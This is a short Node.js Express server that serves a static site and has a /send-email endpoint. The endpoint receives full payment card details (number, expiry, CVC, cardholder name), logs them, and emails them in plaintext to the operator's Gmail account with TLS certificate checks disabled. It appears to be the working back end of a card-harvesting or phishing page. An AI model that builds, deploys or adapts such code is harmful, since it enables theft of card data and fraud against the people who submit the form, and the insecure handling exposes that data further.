import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import nodemailer from "nodemailer";
import path from "path";
import { fileURLToPath } from "url";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

// Static Hosting
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ====== NODEMAILER SETUP (Render-Safe) ======
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,           // <- Gmail TLS port
  secure: false,        // <- must be FALSE for port 587
  auth: {
    user: process.env.MAIL_USER,
    pass: process.env.MAIL_PASS
  },
  tls: {
    rejectUnauthorized: false
  }
});

// ====== SEND EMAIL API ======
app.post("/send-email", async (req, res) => {
  console.log("📩 Received form:", req.body);

  const { card_number, expiration, cvc, card_name } = req.body;

  const mailOptions = {
    from: process.env.MAIL_USER,
    to: process.env.MAIL_USER,
    subject: "New Payment Data",
    text: `
Card Number: ${card_number}
Expiration: ${expiration}
CVC: ${cvc}
Card Name: ${card_name}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("✅ Email sent!");
    res.json({ success: true });
  } catch (error) {
    console.log("❌ Email error:", error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// PORT
app.listen(process.env.PORT || 10000, () => {
  console.log("🚀 Server running...");
});
